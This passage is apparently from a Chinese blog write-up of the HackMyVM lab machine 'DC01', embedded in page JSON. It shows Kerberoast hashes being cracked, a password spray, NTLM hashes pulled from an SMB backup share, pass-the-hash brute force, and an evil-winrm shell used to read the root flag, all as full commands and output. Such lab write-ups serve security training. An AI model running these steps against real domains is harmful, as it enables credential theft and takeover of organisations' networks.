e2a7e1dc3df732b649a44f8a3a24898bcbe85a9a112283515676125f90eefd5b77f98f64ceeb0bb5484c56cf0839d7a4d912b02c2057a54eb438aa07ef4aa9c0ab99f43d3ff932f27bf7c9f5042b6fcc3f8944\n$krb5tgs$<span class=\"hljs-number\">23</span>$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/backup_svc*$bfed86a70449bbde84df73d19b4c7730$5d83b78b8915dc4d7c3a82f08a30ef4fc8eccc08bdfa4af50c14ed5c5ae2184c7bbc1e03677dded3c9acbde601f9197e0563e3df62de7770348f058ecdf8f34581868bb405f028b1084759abf00d76428070faf55c2d329427b7e88d38551d2601bf492a01942c7b06211303a20084226d9f2becc8250de0f011f0f85d45c5591b2ffbaa84252fcaad6e0c9ba7b95cdab95eab6476121d29f701d42932a45fd67c8ee604405b1a66c3ecf7cd92de23c7872c90343093a6f8ce52c6f5179800e731b6684592a96c7d80b0e74d3bf7cb30120ef1d119c8befdea04b7184c660c7988c44452deb5d0cf925943b78aa533fd8038ffd6a6f6e065abe539d1108cc8db6d88ce552a0d6dc2e594c34a958080d34fffd474d8339a32612236b942204149b71dc5430d456d1669a789ff99aa3da173155f4ff73b82800a967289dbb6a78d5e47a826a3d3abf3d6b4c76a442113c19f5d2241b60535d4daf79983d177ea31af42c9faf97dc59481c94cc16b0f0d02af8213b2392113195fa5533a9aa4a2ea5d67d3dd43c905549883c2639f8ebbc7c7dd856a33d8c61abd5936574cd66d4e99b3193819e08bcc0a7c75f4ef7da86a773065b1b859119106d2b46fae158d9aa58e298c2ba97e032bd75b31dd13fe138e63aa021aa401fc455a46f00f4acf4209da6bdcf4a21fa104f7717a7fbd55f7e0aea0735e7aac3cfab70571f2892c67fc83310b3d0c3fb83bae60f82afa3fd5fffe410bc4c33414bdd9008c99342acefb2ef9062c3f1459df8d927ce006967f874ef6b18cf2704296cffb5b5d630ba97de9f8ae7c18821c59a79ea3e46dfa668c781ddf459795f2e71ca8387b41416ce973fccc032adb326cb2af4746440bf01ed2e258980e0296843beabd1089129d1b42b4d1d08f2fde26b95f6983a83af0c39c5db37326f28693ea5ff30f587db1faac0e82a5acb38259f9d3a853640b18806a2cc1007b75c5cd53c82668e39c31d0c6112a13ca6a5ce4d78e4e9418a984e0401209b7e9ed4896ef5f1623db640e45bbf366deadbc841b5738ac9b54d7a1e3a573c9a971db09ff4b3d81b974209df0f038927edcc1c47dcd11e27d18266567b3b134a742a064c5d51c9d15ff19e2a354f7475f5bb10b92e659286b6f1b4d9e54b975f22e6fda5c8ccdd3b8afc437d4c187dfa3abd09bb640388c40fc1cdf78b8736898bdd755d333554bf088c27dedcc2cff91ffa08cc1cd3490ca9e5d42e12aea71bbd0b378f60e398ebf16964f5faad3dbd26f0ae8113191ac4aa25f97ef2ad4a0aa6fc6e736bec6c9cab9257e89c36d439e07e03bdae6e327b7eb4208290120ba2628c02073ad64700022efdcdf21cca7dcc7cb9b91fb72a654da13d83feee2f2afc0c1ccb16f17bce2de0b8211cbee77392cf32ca3c82c7deef6f43dba9aa7bb655ce5d6cde0beb50bec72037f6c20b3797a71e1a33a8be8116c4d807e08afeb2b9dd4c6e09a416baa7c619a9d\n$krb5tgs$<span class=\"hljs-number\">23</span>$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/web_svc*$f81f76f5ea4e5729583d87b18454ddb8$da8b62c1777dc2b29040d0b0ed1d78cda4427f2ed66f05529cdd964f0ac8946e1128c4a7466224e5324c3402515fe8799f6c43a1cc9ab2395e59937a6d1490067a13e8f6bfe3bb6cc041dbaee70cd28ed36e42c29f1fabcc11708c36d5b4fed93bb64f83db8632a082847ae39a5cb198973b3c6eee7fed46a4e23b5d614b289b7784887fffabfc1e450e2a270d0625a582725f71b99b596fc152d96de336f1fef90e1246223ca6f6c8d1095df65b0e0ed2907d172587c4271aa141d22d485a65028c0494f9c382ddac4a506362b1d5f153a51c632e0be7ef373a70dff482933dbaf25dcac873311fe22d64f4bfa3040bc1d6784c6156d056fafc23b3fd396702b065969f0c9e6909b285c183efb72e1678ebea3d53c45db191116c84276d37979b958270be709ecca7c70c41523c97bfb32449322932876fcc0d6a0832a0050e99e582aa49607d60aad48befef8de772be267842bb8e29ac6a381e8fcfec86ff191bdc18f00e4869549f0382a7acc03a9ae361908e854458446728ba97cf71f49630d93663f43dd9ea228824c7d4be9e6d6df4ae1b6c5fec14ef28d438b098b9277f106d9c2b6722ccf5444286f6c50c6a447fadbcebb4819f29a48d8d09427c0aeb97f472e63cb1940837b310ada3eefb661ead053462b960e38518fc1d333652c58e888a912f4f94ee3fcdd1ddd677698e62a58d809ec74176fb0fc1b2c567b2c722f666a2ec88570535dadd15fc0f973ca2c539d12fe4b95f2759f3de7560975195bbfe10eaa070e327672fa1ad65bd75dfa04618ba9ff8d7f1e360410caecef657198f809bc7d955c19657f8787be7037c570b8771bb10d9d0c77d0ca383f2bfc2933c418c85de2d188f9ad7e9af74d9461cdd64be67ae6eab8edcd883426071a09e61e5fd3393dfe58322e80563d9a2be3373bd99617d79f19caba515af375a820f58bf589e46b03c711ec649bab91b8b6e5917de0396c80e5041e66a498575a2df38fe8af550a5d38983e23229bad9f81ab96e1ba22acc9b508636c81a59b646d31bdd2c14e446b37b99f50a5cac11163401902774f8f1e0837957385ad24e962b7d6c6f8dfd7fbc8950bad94f97922173d52ab058fa08ad6c15a711931fb185c2f87dd1345c94f2e66d30b9ef0b541afb5ab675cc3c555170b3db2f59373bc1406cf0f4dda06ed41b516695add5ca472b0c05140a577cf2ec9587bd209583ef9336772e00a2e69a15a3f247a00a386ba3848e9489a29024d4714ae92814efb3d0912494ec57a20a408e8f2a55017d0cc3b0df29777490b7f8acd090dacae1c4165191aa18504d0eec64eb7378e4a26b1aebc1fa555502eddf82e12e71be8aadbc3d6d0c862ea6ac75d503f35738ff01660bcb4b2bbbc2d2fcb80c87cbecf9e71febcfed4bd5a503cd07e5a40adefdf42137fbfdcd94350aab20b8cd033ff56af4d964cffbf7e2a910b7c22196f8ab202e2ed68a8ea54ce9c79e43672675\n$krb5tgs$<span class=\"hljs-number\">23</span>$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/monitoring_svc*$1eb741cbc56c2a8779a88689122bfb7e$9913963c816db0c9bcb9091c5234573ace76790f03a5eb329be671d8c41a26853aaf8615c24a62b6d6ad35d41649c4bbbc5fff0d7587281ac3cd725086c57691469789346f0451823a52e49cfc5d9f83bf9c71e0e5d52d45defce23b9e534694b9673bcc554ec36a6e5b0342780e3238d4b8272458748b73cccc59727578021a7bc8d69a713293884bfa5e4105ae1e60767de187a240cda214b5eb2d544143bb0e21efd8054e33c280726aa18ca441bfe41ac2e663fc9a1e26f1e42bf1148b57e842686bb2a2eb0b7cf8a943c72bbd6924da8a6c630794af8652da77da839cf8b2f633dae5ee9bf84816b0b96e25acd3354a2ee56ef24b1633ccf6aa46ce91ca23db5aca5813682168b314534eee6081bd44669cb7c0a2cb73a4349b92dc9dc58f2963d7847a80449e4c70b2647d8d586569333a5b42b75741e0a5670bd14d753f4f45264a8c26693bb04a2df8dd75e7c8e5c8bbab8b68474a94efe1315692aa716169ae354acf1b4299b35706e3897977e390ad052940e92c72e2d70d195f9837348ecfb477d4d2b4bda16e4e532452d0e8426d222f113c4f85f3c51a8d3f7e61d95040162a5fd5d589a64b5ba7a35571aee68d70c0adce931167db2ff05be14610f327425af7530558da29759afc5b3a7ec2bed7dee68991c3ec2615260e7b9c60825e3b6e071c45b34021c7be82e33771f2d005b8cdf273fe15e3832aacfdc0c086fa1ff4ee8b277fc1a86e9929d6263baffe277842050a7e1d3cd32dc2edf15480f28c6aaee8213b0b9ed9e4ac8e4f5d5073778f16d89587ab92c17676b5366cfdcbcd1d36e9196bf704e37a6fdde0adecb69913eac89a92621aa9f7ed9bd22c02b1d26a8b1ee44f4a0650090f36ee959b990184f596c5962a6ceea33a3b2b6839dc10ff7eaa442087ba9b72ef6227d46d5f514d98df2edf03a29905cc8034d013e002b4f4f752b87cc7d40b54bb585d0641c7a4cef5365e76aabb146aedf962bb1aecf9974b647fe26e9f2ae02b52f139f4e1b8bae778a3b5e366f9f5e51c2f98c9284ec26080ef89be6493d1181f834d19c78bac5cb042f8bc37d6c211988415b96c6c0233136b3c39e8b0d93739ce81164617dc545ae8e533cc9d3812026484da9b74d0327b575eea8d318a1c6c6a92e0f0b4a6adac1fdb27f9d7255fd6cfefd4375908aac8f76c979b6e22fcb123f2e99993ee0428624b18a06e62ee7500322cb8c6b9784311f694fb53c3e37de0ef03ef852789ed717bd1382c4d447ccf89c30126608fa389adf796fecfd1ce64b54532b17d557c5bc404a9629833684c69bb6f9ab7f7dadeef075db931c0a0b3616c9673792876d2db1f2bd854bf1591121cef252fb7cf33f36fc4e833169efdb3636b43783f26c0f6e64a1b13c67d1e90f5e94bc1ef17775c1dd706ccb578769878a94cf7372851df8719ca467654ca73defe4345a243d6caa1abfd032ae8b5f5f8d09b3c865073cdaee6aa412c85\n\n</code></pre>\n<p>进行破解，使用开膛手，得到密码<code>Password123!!</code></p>\n<pre><code class=\"hljs language-python\">john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>.txt\nUsing default <span class=\"hljs-built_in\">input</span> encoding: UTF-<span class=\"hljs-number\">8</span>\nLoaded <span class=\"hljs-number\">5</span> password hashes <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">5</span> different salts (krb5tgs, Kerberos <span class=\"hljs-number\">5</span> TGS etype <span class=\"hljs-number\">23</span> [MD4 HMAC-MD5 RC4])\nWill run <span class=\"hljs-number\">8</span> OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> <span class=\"hljs-keyword\">or</span> Ctrl-C to abort, almost <span class=\"hljs-built_in\">any</span> other key <span class=\"hljs-keyword\">for</span> status\nPassword123!!    (?)     \n1g <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">31</span> DONE (<span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">19</span> 04:<span class=\"hljs-number\">59</span>) <span class=\"hljs-number\">0.03223</span>g/s 462403p/s 2195Kc/s 2195KC/s !)(OPPQR..*<span class=\"hljs-number\">7</span>¡Vamos!\nUse the <span class=\"hljs-string\">\"--show\"</span> option to display <span class=\"hljs-built_in\">all</span> of the cracked passwords reliably\nSession completed. \n\t\n</code></pre>\n<h3>密码喷洒</h3>\n<p>得到密码后进行密码喷洒，看密码属于哪些个用户</p>\n<pre><code class=\"hljs language-python\">crackmapexec smb <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span> -u username.txt -p <span class=\"hljs-string\">'Password123!!'</span> --<span class=\"hljs-keyword\">continue</span>-on-success | grep +\nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Domain Admins:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Domain Users:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Domain Guests:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Domain Computers:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Domain Controllers:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Cert Publishers:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Schema Admins:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Enterprise Admins:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Group Policy Creator Owners:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Read-only Domain Controllers:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Cloneable Domain Controllers:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Protected Users:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Key Admins:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Enterprise Key Admins:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\RAS <span class=\"hljs-keyword\">and</span> IAS Servers:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Allowed RODC Password Replication Group:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\Denied RODC Password Replication Group:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\DnsAdmins:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\DnsUpdateProxy:Password123!! \nSMB                      <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\file_svc:Password123!！\n</code></pre>\n<p>看样子是用户 <code>file_svc</code></p>\n<h3>SMB信息收集</h3>\n<p>获得新用户后再通过SMB获得信息</p>\n<p>经过测试，最后发现<code>backup</code>文件夹该用户有权限，并获得文件 <code>backup_extract.txt</code></p>\n<pre><code class=\"hljs language-python\">smbclient //<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>/backup -U SOUPEDECODE.LOCAL/file_svc%<span class=\"hljs-string\">'Password123!!'</span>\nTry <span class=\"hljs-string\">\"help\"</span> to get a <span class=\"hljs-built_in\">list</span> of possible commands.\nsmb: \\> ls\n  .                                   D        <span class=\"hljs-number\">0</span>  Mon Jun <span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">2024</span>\n  ..                                 DR        <span class=\"hljs-number\">0</span>  Mon Jun <span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">44</span>:<span class=\"hljs-number\">56</span> <span class=\"hljs-number\">2024</span>\n  backup_extract.txt                  A      <span class=\"hljs-number\">892</span>  Mon Jun <span class=\"hljs-number\">17</span> 04:<span class=\"hljs-number\">41</span>:05 <span class=\"hljs-number\">2024</span>\n\n                <span class=\"hljs-number\">12942591</span> blocks of size <span class=\"hljs-number\">4096.</span> <span class=\"hljs-number\">11051255</span> blocks available\nsmb: \\> get backup_extract.txt \ngetting file \\backup_extract.txt of size <span class=\"hljs-number\">892</span> <span class=\"hljs-keyword\">as</span> backup_extract.txt (<span class=\"hljs-number\">32.3</span> KiloBytes/sec) (average <span class=\"hljs-number\">32.3</span> KiloBytes/sec)\nsmb: \\> \n\n┌──(root㉿kali)-[~/Desktop/test/DC01]\n└─<span class=\"hljs-comment\"># cat backup_extract.txt                                                                           </span>\nWebServer$:<span class=\"hljs-number\">2119</span>:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::\nDatabaseServer$:<span class=\"hljs-number\">2120</span>:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::\nCitrixServer$:<span class=\"hljs-number\">2122</span>:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::\nFileServer$:<span class=\"hljs-number\">2065</span>:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::\nMailServer$:<span class=\"hljs-number\">2124</span>:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::\nBackupServer$:<span class=\"hljs-number\">2125</span>:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::\nApplicationServer$:<span class=\"hljs-number\">2126</span>:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::\nPrintServer$:<span class=\"hljs-number\">2127</span>:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::\nProxyServer$:<span class=\"hljs-number\">2128</span>:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::\nMonitoringServer$:<span class=\"hljs-number\">2129</span>:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::\n\n</code></pre>\n<p>文件里边的内容看着像是<code>NTLMhash</code> ，使用脚本做处理得到可以进行爆破的状态</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">'backup_extract.txt'</span>,<span class=\"hljs-string\">'r'</span>) <span class=\"hljs-keyword\">as</span> file1:\n    data = file1.read()\n    lines = data.splitlines()\n<span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">'ntlm.txt'</span>,<span class=\"hljs-string\">'w+'</span>) <span class=\"hljs-keyword\">as</span> file2:\n    <span class=\"hljs-keyword\">for</span> line <span class=\"hljs-keyword\">in</span> lines:\n        file2.write(line[line.rfind(<span class=\"hljs-string\">':'</span>)-<span class=\"hljs-number\">34</span>:line.rfind(<span class=\"hljs-string\">':'</span>)-<span class=\"hljs-number\">2</span>]+<span class=\"hljs-string\">'\\n'</span>)\n<span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">'usernmae2.txt'</span>,<span class=\"hljs-string\">'w+'</span>) <span class=\"hljs-keyword\">as</span> file3:\n    <span class=\"hljs-keyword\">for</span> line <span class=\"hljs-keyword\">in</span> lines:\n        file3.write(line[:line.find(<span class=\"hljs-string\">':'</span>)]+<span class=\"hljs-string\">'\\n'</span>)\n</code></pre>\n<p>经过脚本处理后得到<code>NTLM.txt</code>和<code>username2.txt</code></p>\n<pre><code class=\"hljs language-python\">// username2.txt\nWebServer$\nDatabaseServer$\nCitrixServer$\nFileServer$\nMailServer$\nBackupServer$\nApplicationServer$\nPrintServer$\nProxyServer$\nMonitoringServer$\n</code></pre>\n<pre><code class=\"hljs language-python\">// NTLM.txt\nc47b45f5d4df5a494bd19f13e14f7902\n406b424c7b483a42458bf6f545c936f7\n48fc7eca9af236d7849273990f6c5117\ne41da7e79a4c76dbd9cf79d1cb325559\n46a4655f18def136b3bfab7b0b4e70e3\n46a4655f18def136b3bfab7b0b4e70e3\n8cd90ac6cba6dde9d8038b068c17e9f5\nb8a38c432ac59ed00b2a373f4f050d28\n4e3f0bb3e5b6e3e662611b1a87988881\n48fc7eca9af236d7849273990f6c5117\n</code></pre>\n<h3>使用netexec进行爆破</h3>\n<p>像是进行爆破PTH，得到用户<code>FileServer$</code> 的凭据</p>\n<pre><code class=\"hljs language-python\">nxc smb <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span> -u usernmae2.txt -H ntlm.txt\nSMB         <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01             [+] SOUPEDECODE.LOCAL\\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)\n</code></pre>\n<p>然后使用<code>evil-winrm</code>进行获得<code>shell</code></p>\n<pre><code class=\"hljs language-python\">evil-winrm -i <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span> -u <span class=\"hljs-string\">'FileServer$'</span> -H <span class=\"hljs-string\">'e41da7e79a4c76dbd9cf79d1cb325559'</span>\n                                        \nEvil-WinRM shell v3<span class=\"hljs-number\">.7</span>\n                                        \nWarning: Remote path completions <span class=\"hljs-keyword\">is</span> disabled due to ruby limitation: quoting_detection_proc() function <span class=\"hljs-keyword\">is</span> unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class=\"hljs-comment\">#Remote-path-completion</span>\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\FileServer$\\Documents>\n\n</code></pre>\n<p>进行<code>root.flag</code>读取</p>\n<h3>Root Flag</h3>\n<pre><code class=\"hljs language-python\">*Evil-WinRM* PS C:\\Users\\administrator\\Desktop> <span class=\"hljs-built_in\">type</span> root.txt\na9564ebc3289b7a14551baf8ad5ec60a\n</code></pre>","title":"HackMyVM - DC01","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机"},"recentPosts":[{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Season8 - TombWatcher","date":"2025-06-08","isEncrypted":true,"year":"2025","month":"06","day":"08"},{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"},{"id":"HackTheBoxMachine -Support","title":"HackTheBox - Machine - Support","date":"2025-06-05","isEncrypted":false,"year":"2025","month":"06","day":"05"},{"id":"HackTheBoxMachine - Hospital","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","isEncrypted":false,"year":"2025","month":"06","day":"04"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Season8 - Certificate","date":"2025-06-02","isEncrypted":true,"year":"2025","month":"06","day":"02"},{"id":"HackTheBoxMachine - Strutted","title":"HackTheBox - Machine - Strutted","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"06","day":"02"},{"id":"VulnyxBuild","title":"Vulnyx - Build","date":"2025-06-01","isEncrypted":false,"year":"2025","month":"06","day":"01"}]},"__N_SSG":true}